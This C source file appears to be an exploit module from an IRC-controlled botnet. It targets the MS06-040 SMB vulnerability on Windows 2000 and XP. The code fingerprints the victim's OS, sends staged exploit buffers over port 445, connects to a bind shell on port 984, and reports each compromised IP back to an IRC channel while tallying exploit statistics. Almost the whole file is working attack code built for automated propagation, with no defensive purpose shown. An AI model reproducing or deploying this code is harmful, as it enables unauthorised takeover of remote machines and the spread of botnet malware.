#include "includes.h"
#include "functions.h"
#include "ms06-40-w2k.h"
#include "ms06-40-wXP.h"

#pragma comment(lib, "ws2_32.lib")

BOOL MS0640(char *asd, void* codnn,EXINFO exinfo)
{
	int fd;
	int con;
	int repbf[20000];
	IRC* irc=(IRC*)codnn;

	struct sockaddr_in target;

	WSADATA wsaData;
	if(WSAStartup(0x0101,&wsaData) != 0)
	{
		return FALSE;
	}

	int OS=FpHost(exinfo.ip, FP_RPC);
	if(OS==OS_UNKNOWN) OS=FpHost(exinfo.ip, FP_SMB);
	if(OS==OS_UNKNOWN) return FALSE;

	fd = socket(AF_INET,SOCK_STREAM,0);

	if(fd < 0)
	{
		return FALSE;
	}

	target.sin_family = AF_INET;
	target.sin_addr.s_addr = inet_addr(exinfo.ip);
	target.sin_port = htons(445);

	con = connect(fd,(struct sockaddr *)&target,sizeof(target));

	if(con < 0)
	{
		return FALSE;
	}
	
	int nTimeout = 5000;
	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char*)&nTimeout,sizeof(nTimeout));

	if (OS == 2)
	{
		send(fd,win2k0640_0,sizeof(win2k0640_0),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_1,sizeof(win2k0640_1),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_2,sizeof(win2k0640_2),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_3,sizeof(win2k0640_3),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_4,sizeof(win2k0640_4),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_5,sizeof(win2k0640_5),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_6,sizeof(win2k0640_6),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_7,sizeof(win2k0640_7),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_8,sizeof(win2k0640_8),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_9,sizeof(win2k0640_9),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_10,sizeof(win2k0640_10),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,win2k0640_11,sizeof(win2k0640_11),0);

	}else if (OS == 3)
	{
		send(fd,winXP0640_0,sizeof(winXP0640_0),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_1,sizeof(winXP0640_1),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_2,sizeof(winXP0640_2),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_3,sizeof(winXP0640_3),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_4,sizeof(winXP0640_4),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_5,sizeof(winXP0640_5),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_6,sizeof(winXP0640_6),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_7,sizeof(winXP0640_7),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_8,sizeof(winXP0640_8),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_9,sizeof(winXP0640_9),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_10,sizeof(winXP0640_10),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_11,sizeof(winXP0640_11),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);

		send(fd,winXP0640_12,sizeof(winXP0640_12),0);
		recv(fd,(char *)repbf,sizeof(repbf),0);
		
		send(fd,winXP0640_13,sizeof(winXP0640_13),0);
	}

	recv(fd,(char *)repbf,sizeof(repbf),0);

	closesocket(fd);

	Sleep(2000);

	if (ConnectShell(exinfo,984))
	{
		if (!exinfo.silent)
			irc->privmsg(asd,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
		exploit[exinfo.exploit].stats++;
		return TRUE;
	}else{
		return FALSE;
	}

}

